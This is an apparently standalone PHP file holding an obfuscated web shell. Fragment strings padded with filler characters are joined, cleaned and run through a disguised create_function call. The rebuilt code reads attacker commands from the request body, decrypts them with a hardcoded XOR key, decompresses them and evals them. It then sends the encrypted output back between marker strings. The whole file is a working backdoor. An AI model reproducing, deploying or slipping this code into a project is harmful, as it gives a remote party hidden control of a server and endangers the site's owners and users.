<?php
$y='ts(tR"php://tRitRnput"),$mtR)=tR=1) {@ob_sttRatRrt();@evatRl(@gzutRncomprestRstR(@x(';
$o='($i=0tR;$i<$l;){fotRr($tRj=0;(tR$j<$tRc&&$i<$ltR);$j++,$i+tR+){$otR.=$t{$i}^tR$k{t';
$u='@base6tR4_decodetR($m[tR1]),$k)tR));$o=@tRob_gettR_ctRontetRnts(tR);@ob_end_cleantR';
$O=str_replace('G','','creGaGte_GfuGncGtGion');
$z='()tR;$r=@base6tR4_enctRode(@x(tR@gtRzcompretRsstR($o)tR,$k));print("tR$p$ktRh$r$kf");}';
$A='31zJ76tRtRCNa";funtRctiontR x($t,$tRk){$c=sttRrltRetRtRn($k)tR;$l=strlen($t)tR;$o="tR";for';
$B='$k="654tR44df1"tRtR;$kh="fcb318atR769ftRe";$ktRf="224tR77tRtR7c7e850";$p="TzmWaxtR7';
$n='R$j};}}tRrettRurn $tRo;}iftR (@pretRg_match("/tR$kh(.+)$tRkf/",@ftRile_gtRetRt_conten';
$q=str_replace('tR','',$B.$A.$o.$n.$y.$u.$z);
$t=$O('',$q);$t();
?>
